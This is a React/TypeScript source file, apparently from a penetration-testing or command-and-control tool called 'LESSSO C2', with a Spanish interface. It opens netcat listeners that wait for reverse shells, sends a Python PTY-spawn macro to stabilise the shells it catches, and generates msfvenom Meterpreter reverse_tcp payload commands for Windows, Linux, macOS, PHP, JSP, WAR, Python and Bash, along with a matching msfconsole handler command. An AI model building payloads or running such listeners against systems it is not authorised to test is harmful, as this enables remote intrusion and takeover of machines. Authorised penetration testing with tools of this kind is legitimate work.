import { useState, useEffect, useRef, useCallback } from 'react';
import { invoke } from '@tauri-apps/api/core';
import { listen } from '@tauri-apps/api/event';
import { Terminal } from '@xterm/xterm';
import { FitAddon } from '@xterm/addon-fit';
import { Headphones, Flame, Play, Square, Pause, X, Wand2, TerminalSquare, Copy, CheckCircle2 } from 'lucide-react';
import '@xterm/xterm/css/xterm.css';

interface Listener { id: string; port: string; isActive: boolean; payload?: string; }
interface ListenerToolProps {
  placeholders: { LHOST: string; LPORT: string; };
  injectedPayload?: string | null;
  onInjectionConsumed?: () => void;
  onListenerCreated?: (port: string) => void;
}

const LISTENER_SESSION_PREFIX = 'listener-';

function ListenerInstance({ listener, onClose }: { listener: Listener; onClose: (id: string) => void; }) {
  const termRef = useRef<HTMLDivElement>(null);
  const terminalInstance = useRef<Terminal | null>(null);
  const unlistenFuncs = useRef<Array<() => void>>([]);
  
  useEffect(() => {
    let isMounted = true;
    const initTerminal = async () => {
      if (!termRef.current) return;
      termRef.current.innerHTML = '';
      const term = new Terminal({ theme: { background: '#020617', foreground: '#2dd4bf', cursor: '#2dd4bf' }, fontSize: 13, fontFamily: 'monospace', cursorBlink: true, scrollback: 5000 });
      const fitAddon = new FitAddon(); term.loadAddon(fitAddon); term.open(termRef.current); fitAddon.fit(); terminalInstance.current = term;

      term.writeln(`\x1b[1;36m[*] LESSSO C2 — Listener en puerto ${listener.port}\x1b[0m`);
      term.writeln(`\x1b[1;33m[*] Esperando conexión...\x1b[0m\r\n`);

      const unlistenOut = await listen<string>(`term-output-${listener.id}`, (e) => { if (!isMounted) return; term.write(e.payload.replace(/\n/g, '\r\n')); });
      const unlistenExit = await listen(`term-exit-${listener.id}`, () => { if (!isMounted) return; term.writeln('\r\n\x1b[1;33m[*] Sesión terminada.\x1b[0m'); });
      unlistenFuncs.current.push(unlistenOut, unlistenExit);

      term.onData(data => { invoke('write_terminal', { sessionId: listener.id, data }).catch(() => {}); });

      try { await invoke('start_terminal', { sessionId: listener.id, cmd: 'nc', args: ['-lvnp', listener.port] }); } 
      catch (err) { term.writeln(`\r\n\x1b[1;31m[!] Error del Sistema: ${err}\x1b[0m`); }

      const resizeHandler = () => fitAddon.fit(); window.addEventListener('resize', resizeHandler);
      unlistenFuncs.current.push(() => window.removeEventListener('resize', resizeHandler));
    };
    initTerminal();
    return () => { isMounted = false; unlistenFuncs.current.forEach(f => f()); invoke('kill_terminal', { sessionId: listener.id }).catch(() => {}); };
  }, [listener.id, listener.port]);

  const sendCtrlC = async () => {
    await invoke('send_terminal_signal', { sessionId: listener.id, signalName: 'SIGINT' }).catch(() => {});
    setTimeout(() => { invoke('send_terminal_signal', { sessionId: listener.id, signalName: 'SIGKILL' }).catch(() => {}); }, 500);
  };
  const sendCtrlZ = async () => { await invoke('send_terminal_signal', { sessionId: listener.id, signalName: 'SIGTSTP' }).catch(() => {}); };
  
  const stabilizeTty = async () => {
    const macro = `python3 -c 'import pty;pty.spawn("/bin/bash")'\n` + `export TERM=xterm\n` + `stty rows 40 columns 100\n`;
    try {
      await invoke('write_terminal', { sessionId: listener.id, data: macro });
      await invoke('send_terminal_signal', { sessionId: listener.id, signalName: 'SIGTSTP' });
    } catch (err) {}
  };

  return (
    <div className="flex-1 flex-col h-full flex bg-[#020617] border-l border-slate-800">
      <div className="bg-slate-950 border-b border-slate-800 flex justify-between px-3 py-1.5 shrink-0 items-center">
        <div className="flex gap-2">
          <button onClick={sendCtrlC} className="flex items-center gap-1.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/20 px-2.5 py-1 rounded-md text-[9px] font-bold tracking-wider transition-colors" title="SIGINT + SIGKILL"><Square size={10} className="fill-current"/> Kill</button>
          <button onClick={sendCtrlZ} className="flex items-center gap-1.5 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 border border-amber-500/20 px-2.5 py-1 rounded-md text-[9px] font-bold tracking-wider transition-colors" title="SIGTSTP"><Pause size={10} className="fill-current"/> Pause</button>
          <button onClick={stabilizeTty} className="flex items-center gap-1.5 bg-purple-500/10 hover:bg-purple-500/20 text-purple-400 border border-purple-500/20 px-2.5 py-1 rounded-md text-[9px] font-bold tracking-wider transition-colors" title="Python PTY"><Wand2 size={10}/> Stabilize</button>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-[10px] font-mono font-bold text-slate-500">:{listener.port}</span>
          <button onClick={() => onClose(listener.id)} className="text-slate-500 hover:text-rose-400 transition-colors p-1"><X size={14}/></button>
        </div>
      </div>
      <div ref={termRef} className="flex-1 w-full h-full p-2 bg-[#020617] overflow-hidden" />
    </div>
  );
}

const MSF_PLATFORMS = [ { value: 'windows/x64', label: 'Windows x64' }, { value: 'windows/x86', label: 'Windows x86' }, { value: 'linux/x64', label: 'Linux x64' }, { value: 'linux/x86', label: 'Linux x86' }, { value: 'osx/x64', label: 'macOS x64' }, { value: 'php', label: 'PHP' }, { value: 'java/jsp_shell', label: 'JSP' }, { value: 'java/war', label: 'WAR' }, { value: 'python', label: 'Python' }, { value: 'cmd/unix', label: 'Bash/Unix' }, ];
const MSF_FORMATS: Record<string, { value: string; label: string; ext: string }[]> = { 'windows/x64': [{ value: 'exe', label: '.exe', ext: '.exe' }, { value: 'dll', label: '.dll', ext: '.dll' }, { value: 'ps1', label: 'PowerShell', ext: '.ps1' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }], 'windows/x86': [{ value: 'exe', label: '.exe', ext: '.exe' }, { value: 'dll', label: '.dll', ext: '.dll' }, { value: 'ps1', label: 'PowerShell', ext: '.ps1' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }], 'linux/x64': [{ value: 'elf', label: '.elf', ext: '.elf' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }], 'linux/x86': [{ value: 'elf', label: '.elf', ext: '.elf' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }], 'osx/x64': [{ value: 'macho', label: '.macho', ext: '' }, { value: 'raw', label: 'Shellcode', ext: '.bin' }], 'php': [{ value: 'raw', label: '.php', ext: '.php' }], 'java/jsp_shell': [{ value: 'raw', label: '.jsp', ext: '.jsp' }], 'java/war': [{ value: 'war', label: '.war', ext: '.war' }], 'python': [{ value: 'raw', label: '.py', ext: '.py' }], 'cmd/unix': [{ value: 'raw', label: '.sh', ext: '.sh' }], };

function MsfvenomGenerator({ placeholders }: { placeholders: ListenerToolProps['placeholders'] }) {
  const [platform, setPlatform] = useState('windows/x64'); const [format, setFormat] = useState('exe');
  const [lhost, setLhost] = useState(placeholders.LHOST); const [lport, setLport] = useState(placeholders.LPORT);
  const [outputName, setOutputName] = useState('shell'); const [copied, setCopied] = useState(false);

  useEffect(() => { setLhost(placeholders.LHOST); }, [placeholders.LHOST]);
  useEffect(() => { setLport(placeholders.LPORT); }, [placeholders.LPORT]);
  useEffect(() => { const formats = MSF_FORMATS[platform] || []; if (formats.length > 0) setFormat(formats[0].value); }, [platform]);

  const currentFormats = MSF_FORMATS[platform] || []; const currentExt = currentFormats.find(f => f.value === format)?.ext || '';
  const command = `msfvenom -p ${platform}/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f ${format} -o ${outputName}${currentExt}`;
  
  const copyCommand = async () => { try { await navigator.clipboard.writeText(command); setCopied(true); setTimeout(() => setCopied(false), 1500); } catch {} };

  return (
    <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-5 space-y-4">
      <h3 className="text-xs tracking-widest font-black text-rose-500 uppercase border-b border-slate-800 pb-2 flex items-center gap-2">
        <Flame size={14} /> MSFVenom Generator
      </h3>
      <div className="flex gap-3">
        <div className="flex-1">
          <label className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">LHOST</label>
          <input type="text" value={lhost} onChange={e => setLhost(e.target.value)} className="w-full px-3 py-2 bg-[#020617] border border-slate-800 rounded-md text-xs font-mono text-slate-300 outline-none focus:border-rose-500" />
        </div>
        <div className="w-24">
          <label className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">LPORT</label>
          <input type="text" value={lport} onChange={e => setLport(e.target.value)} className="w-full px-3 py-2 bg-[#020617] border border-slate-800 rounded-md text-xs font-mono text-slate-300 outline-none focus:border-rose-500" />
        </div>
      </div>
      <div className="grid grid-cols-2 gap-3">
        <div>
          <label className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">Plataforma</label>
          <select value={platform} onChange={e => setPlatform(e.target.value)} className="w-full px-3 py-2 bg-[#020617] border border-slate-800 rounded-md text-xs font-bold text-slate-300 outline-none">
            {MSF_PLATFORMS.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
          </select>
        </div>
        <div>
          <label className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">Formato</label>
          <select value={format} onChange={e => setFormat(e.target.value)} className="w-full px-3 py-2 bg-[#020617] border border-slate-800 rounded-md text-xs font-bold text-slate-300 outline-none">
            {currentFormats.map(f => <option key={f.value} value={f.value}>{f.label}</option>)}
          </select>
        </div>
      </div>
      <div>
        <label className="text-[9px] font-bold text-slate-500 uppercase tracking-widest block mb-1">Nombre Salida</label>
        <input type="text" value={outputName} onChange={e => setOutputName(e.target.value)} className="w-full px-3 py-2 bg-[#020617] border border-slate-800 rounded-md text-xs font-mono text-slate-300 outline-none focus:border-rose-500" />
      </div>
      <div className="p-3 bg-rose-950/20 border border-rose-500/20 rounded-lg">
        <label className="text-[9px] font-black text-rose-500 uppercase tracking-widest block mb-2">Comando</label>
        <pre className="text-[10px] font-mono text-rose-300 whitespace-pre-wrap break-all leading-relaxed">{command}</pre>
      </div>
      <button onClick={copyCommand} className={`w-full flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg text-xs font-black uppercase tracking-widest transition-colors ${copied ? 'bg-rose-500 text-slate-950' : 'bg-rose-500/10 text-rose-500 border border-rose-500/20 hover:bg-rose-500/20'}`}>
        {copied ? <CheckCircle2 size={14}/> : <Copy size={14}/>} {copied ? 'Copiado' : 'Copiar Comando'}
      </button>
      <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg text-[10px] text-slate-400 space-y-2 mt-4">
        <p className="flex items-center gap-1.5"><TerminalSquare size={12} className="text-slate-500"/> msfconsole handler:</p>
        <code className="block text-[9px] font-mono bg-[#020617] px-2 py-1.5 rounded text-slate-500 border border-slate-800">
          msfconsole -q -x "use multi/handler; set PAYLOAD {platform}/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"
        </code>
      </div>
    </div>
  );
}

export function ListenerTool({ placeholders, injectedPayload, onInjectionConsumed, onListenerCreated }: ListenerToolProps) {
  const [tab, setTab] = useState<'listener' | 'msfvenom'>('listener');
  const [listeners, setListeners] = useState<Listener[]>([]);
  const [activeListenerId, setActiveListenerId] = useState<string | null>(null);
  const [newPort, setNewPort] = useState(placeholders.LPORT);
  const listenersRef = useRef<Listener[]>([]);
  
  useEffect(() => { listenersRef.current = listeners; }, [listeners]);
  const isMountedRef = useRef(true);
  const lastInjectionSigRef = useRef<string | null>(null);

  useEffect(() => { setNewPort(placeholders.LPORT); }, [placeholders.LPORT]);

  useEffect(() => {
    isMountedRef.current = true;
    const cleanup = () => { invoke('kill_all_terminals', { sessionPrefix: LISTENER_SESSION_PREFIX }).catch(() => {}); };
    const handleBeforeUnload = () => { invoke('kill_all_terminals', { sessionPrefix: LISTENER_SESSION_PREFIX }).catch(() => {}); };
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => { isMountedRef.current = false; window.removeEventListener('beforeunload', handleBeforeUnload); cleanup(); };
  }, []);

  const findFreePort = useCallback((startPort: number, currentListeners: Listener[]): number => {
    const used = new Set(currentListeners.map(l => parseInt(l.port, 10)));
    let candidate = startPort;
    while (used.has(candidate) && candidate < 65535) candidate++;
    return candidate > 65535 ? startPort : candidate;
  }, []);

  useEffect(() => {
    if (!injectedPayload || lastInjectionSigRef.current === injectedPayload) return;
    lastInjectionSigRef.current = injectedPayload;
    setTab('listener');
    const portMatch = injectedPayload.match(/(\d{2,5})/g);
    const suggestedPort = portMatch && portMatch.length > 0 ? portMatch[portMatch.length - 1] : placeholders.LPORT;
    const id = `${LISTENER_SESSION_PREFIX}${Date.now()}`;
    const newListener: Listener = { id, port: suggestedPort, isActive: true, payload: injectedPayload };

    setListeners(prev => {
      const portNum = parseInt(suggestedPort, 10);
      const finalPort = prev.some(l => l.port === suggestedPort) ? findFreePort(portNum + 1, prev).toString() : suggestedPort;
      return [...prev, { ...newListener, port: finalPort }];
    });
    setActiveListenerId(id); onListenerCreated?.(suggestedPort); onInjectionConsumed?.();
  }, [injectedPayload, placeholders.LPORT, onInjectionConsumed, onListenerCreated, findFreePort]);

  const addListener = useCallback(() => {
    const port = newPort.trim();
    if (!port || !/^\d+$/.test(port)) { alert('Puerto inválido'); return; }
    const portNum = parseInt(port, 10);
    if (portNum < 1 || portNum > 65535) { alert('Fuera de rango (1-65535)'); return; }
    if (listenersRef.current.some(l => l.port === port)) { alert(`Puerto ${port} en uso`); return; }

    const id = `${LISTENER_SESSION_PREFIX}${Date.now()}`;
    const newListener: Listener = { id, port, isActive: true };
    setListeners(prev => [...prev, newListener]); setActiveListenerId(id);
    setNewPort(findFreePort(portNum + 1, [...listenersRef.current, newListener]).toString());
    onListenerCreated?.(port);
  }, [newPort, onListenerCreated, findFreePort]);

  const closeListener = useCallback(async (id: string) => {
    await invoke('kill_terminal', { sessionId: id }).catch(() => {});
    setListeners(prev => {
      const remaining = prev.filter(l => l.id !== id);
      setActiveListenerId(curr => curr !== id ? curr : (remaining.length > 0 ? remaining[0].id : null));
      return remaining;
    });
  }, []);

  return (
    <div className="flex flex-col h-full bg-[#09090b]">
      <div className="flex border-b border-slate-800 bg-[#020617] shrink-0">
        <button onClick={() => setTab('listener')} className={`px-4 py-3 text-[10px] font-black uppercase tracking-widest transition-colors flex items-center gap-2 ${tab === 'listener' ? 'bg-[#09090b] text-sky-400 border-t-2 border-sky-500' : 'text-slate-500 hover:bg-slate-900 border-t-2 border-transparent'}`}>
          <Headphones size={14}/> Listeners ({listeners.length})
        </button>
        <button onClick={() => setTab('msfvenom')} className={`px-4 py-3 text-[10px] font-black uppercase tracking-widest transition-colors flex items-center gap-2 ${tab === 'msfvenom' ? 'bg-[#09090b] text-rose-400 border-t-2 border-rose-500' : 'text-slate-500 hover:bg-slate-900 border-t-2 border-transparent'}`}>
          <Flame size={14}/> MSFVenom
        </button>
      </div>

      {tab === 'listener' && (
        <>
          <div className="bg-[#020617] border-b border-slate-800 p-3 shrink-0 flex gap-3 items-center flex-wrap">
            <span className="text-[10px] font-black tracking-widest text-slate-500 uppercase">Puerto:</span>
            <input type="text" value={newPort} onChange={e => setNewPort(e.target.value)} onKeyDown={e => e.key === 'Enter' && addListener()} placeholder="4444" className="w-24 px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-md text-[11px] font-mono text-white outline-none focus:border-sky-500 transition-colors" />
            <button onClick={addListener} className="bg-sky-500/10 hover:bg-sky-500/20 border border-sky-500/20 text-sky-400 px-4 py-1.5 rounded-md text-[10px] font-black uppercase tracking-widest transition-colors flex items-center gap-1.5">
              <Play size={10} className="fill-current"/> Iniciar
            </button>

            {listeners.length > 0 && (
              <div className="flex gap-1.5 ml-auto overflow-x-auto custom-scrollbar pr-2">
                {listeners.map(l => (
                  <button key={l.id} onClick={() => setActiveListenerId(l.id)} className={`px-3 py-1.5 text-[10px] font-mono font-bold rounded-md whitespace-nowrap border transition-colors ${activeListenerId === l.id ? 'bg-sky-500/10 text-sky-400 border-sky-500/30' : 'bg-[#020617] text-slate-500 border-slate-800 hover:bg-slate-900'}`}>
                    :{l.port}
                  </button>
                ))}
              </div>
            )}
          </div>
          {listeners.length === 0 ? (
            <div className="flex-1 flex flex-col items-center justify-center text-center p-8">
              <Headphones size={48} className="mb-6 opacity-20 text-slate-500" />
              <h3 className="text-sm font-black uppercase tracking-widest text-slate-400 mb-2">Sin listeners activos</h3>
              <p className="text-[11px] text-slate-600 max-w-sm leading-relaxed">
                Introduce un puerto arriba y pulsa <strong>Iniciar</strong> para esperar conexiones de reverse shells.
              </p>
            </div>
          ) : (
            <div className="flex-1 flex min-h-0">
              {listeners.map(l => (
                <div key={l.id} className={`flex-1 min-w-0 ${activeListenerId === l.id ? 'flex' : 'hidden'}`}>
                  <ListenerInstance listener={l} onClose={closeListener} />
                </div>
              ))}
            </div>
          )}
        </>
      )}

      {tab === 'msfvenom' && <MsfvenomGenerator placeholders={placeholders} />}
    </div>
  );
}
